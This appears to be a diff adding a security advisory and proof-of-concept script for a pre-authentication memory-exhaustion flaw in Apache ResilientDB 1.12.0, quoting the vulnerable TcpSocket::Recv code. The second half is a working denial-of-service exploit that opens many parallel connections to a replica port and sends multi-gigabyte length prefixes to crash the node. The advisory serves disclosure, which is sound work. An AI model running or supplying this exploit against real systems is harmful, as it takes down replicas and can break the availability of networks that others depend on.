@@ -1,0 +1,89 @@
+#!/usr/bin/env python
+#
+#
+# Apache ResilientDB 1.12.0 Uncontrolled Memory Allocation DoS
+#
+#
+# Vendor: The Apache Software Foundation
+# Product web page: https://resilientdb.apache.org
+# Affected version: 1.12.0 (NexRes)
+#
+# Summary: Apache ResilientDB is a High Throughput Yielding Permissioned Blockchain
+# Fabric founded by ExpoLab at UC Davis in 2018. ResilientDB advocates a system-centric
+# design by implementing a multi-threaded architecture with deep pipelines. Further,
+# ResilientDB separates the ordering of client transactions from their execution, allowing
+# it to process messages out of order.
+#
+# Desc: Apache ResilientDB (incubating) suffers from a remote pre-authentication uncontrolled
+# memory allocation in its replica TCP acceptor. In platform/common/network/tcp_socket.cpp,
+# TcpSocket::Recv reads an 8-byte length prefix directly off the socket and passes it to
+# malloc() with no maximum-size check and no NULL-check, then reads that many bytes. This
+# routine is reached, before any signature or authentication check, from the replica's main
+# service listener (platform/rdbc/acceptor.cpp Acceptor::Run -> Accept -> Recv, started by
+# platform/networkstrate/service_network.cpp). Any host that can open a TCP connection to
+# a replica's service port can therefore send a large length prefix and force an arbitrarily
+# large allocation; a handful of parallel connections declaring multi-gigabyte lengths exhaust
+# the replica's memory (OOM), taking the node down and, at scale, breaking the network's
+# BFT liveness.
+#
+# =================================================================================
+# /platform/common/network/tcp_socket.cpp:
+# ----------------------------------------
+# 202: int TcpSocket::Recv(void** buf, size_t* len) {
+# 203:   int ret = RecvInternal(socket_fd_, len, sizeof(size_t));
+# 204:   if (ret <= 0) {
+# 205:     return ret;
+# 206:   }
+# 207:   *buf = malloc(*len);
+# 208:   ret = RecvInternal(socket_fd_, *buf, *len);
+# 209:   if (ret <= 0) {
+# 210:     return ret;
+# 211:   }
+# 212:   return ret;
+# 213: }
+# =================================================================================
+#
+# Tested on: Ubuntu 22.04
+#
+#
+# Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+#                             @zeroscience
+#
+#
+# Advisory ID: ZSL-2026-6017
+# Advisory URL: https://www.zeroscience.mk/#/advisories/ZSL-2026-6017
+#
+#
+# 13.08.2026
+#
+
+
+import threading
+import struct
+import socket
+import time
+import sys
+
+def hit(ip, port, alloc):
+    try:
+        s = socket.create_connection((ip, port), timeout=5)
+        s.sendall(struct.pack("<Q", alloc))
+        time.sleep(30)
+        s.close()
+    except Exception as e:
+        print(f"[!] {e}")
+
+def main():
+    if len(sys.argv) < 3:
+        print("usage: resilientdb_poc.py <ip> <port> 8589934592 16"); return
+    ip = sys.argv[1]; port = int(sys.argv[2])
+    alloc = int(sys.argv[3]) if len(sys.argv) > 3 else (8 * 1024**3)
+    conns = int(sys.argv[4]) if len(sys.argv) > 4 else 16
+    print(f"[*] {ip}:{port}  ->  {conns} connections x malloc({alloc} bytes) pre-auth")
+    ts = [threading.Thread(target=hit, args=(ip, port, alloc), daemon=True) for _ in range(conns)]
+    for t in ts: t.start()
+    for t in ts: t.join()
+    print("[*] OoMd.")
+
+if __name__ == "__main__":
+    main()
